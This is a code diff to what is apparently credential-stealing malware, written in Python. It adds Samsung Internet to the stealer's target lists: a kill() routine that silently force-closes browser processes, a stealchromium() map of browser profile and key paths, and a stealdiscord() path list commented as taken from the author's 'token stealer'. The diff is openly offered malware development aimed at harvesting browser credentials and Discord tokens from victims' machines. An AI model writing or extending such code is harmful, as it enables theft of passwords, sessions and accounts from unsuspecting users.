@@ -59,7 +59,7 @@ def load_nss(profile_path, nss3):
             return nss
 
 def kill():
-    exes = ['msedge.exe', 'chromium.exe', 'iron.exe', 'wavebrowser.exe', 'iridium.exe', 'vivaldi.exe', 'zen.exe', 'chrome.exe', 'mullvadbrowser.exe' 'amigo.exe', 'epic.exe', 'comet.exe', 'shift.exe', 'escosiabrowser.exe', 'duckduckgo.exe', 'dragon.exe', 'brave.exe', 'opera.exe', 'firefox.exe', 'hola.exe', 'AVGBrowser.exe', 'hola-browser.exe', 'waterfox.exe', 'seamonkey.exe', 'AvastBrowser.exe', 'browser.exe']
+    exes = ['msedge.exe', 'chromium.exe', 'iron.exe', 'wavebrowser.exe', 'samsunginternet.exe', 'iridium.exe', 'vivaldi.exe', 'zen.exe', 'chrome.exe', 'mullvadbrowser.exe' 'amigo.exe', 'epic.exe', 'comet.exe', 'shift.exe', 'escosiabrowser.exe', 'duckduckgo.exe', 'dragon.exe', 'brave.exe', 'opera.exe', 'firefox.exe', 'hola.exe', 'AVGBrowser.exe', 'hola-browser.exe', 'waterfox.exe', 'seamonkey.exe', 'AvastBrowser.exe', 'browser.exe']
 
     for exe in exes:
         subprocess.run(["taskkill", "/F", "/IM", exe], text=True, creationflags=subprocess.CREATE_NO_WINDOW)
@@ -230,6 +230,7 @@ def stealchromium():
         'Chromium': {'path': localappdata + '\\Chromium\\User Data', 'localstate': localappdata + '\\Chromium\\User Data\\Local State'},
         'Amigo': {'path': localappdata + '\\Amigo\\User Data', 'localstate': localappdata + '\\Amigo\\User Data\\Local State'},
         'Hola': {'path': localappdata + '\\Hola\\chromium_profile', 'localstate': localappdata + '\\Hola\\chromium_profile\\Local State'},
+        'Samsung Internet': {'path': localappdata + '\\Samsung\\Internet\\User Data', 'localstate': localappdata + '\\Samsung\\Internet\\User Data\\Local State'},
         'Supermium': {'path': localappdata + '\\Supermium\\User Data', 'localstate': localappdata + '\\Supermium\\User Data\\Local State'},
         'Iridium': {'path': localappdata + '\\Iridium\\User Data', 'localstate': localappdata + '\\Iridium\\User Data\\Local State'},
         'WaveBrowser': {'path': localappdata + '\\WaveBrowser\\User Data', 'localstate': localappdata + '\\WaveBrowser\\User Data\\Local State'},
@@ -495,6 +496,7 @@ def stealdiscord(): #stole this from my token stealer
     '0Comodo': os.path.join(local, 'Comodo', 'Dragon', 'User Data'),
     '0Epic': os.path.join(local, 'Epic Privacy Browser', 'User Data'),
     '0Thorium': os.path.join(local, 'Thorium', 'User Data'),
+    '0SamsungInternet': os.path.join(local, 'Samsung', 'Internet', 'User Data'),
     '0Cromite': os.path.join(local, 'Cromite', 'User Data'),
     '0Shift': os.path.join(local, 'Shift', 'User Data'),
     '0WaveBrowser': os.path.join(local, 'WaveBrowser', 'User Data'),
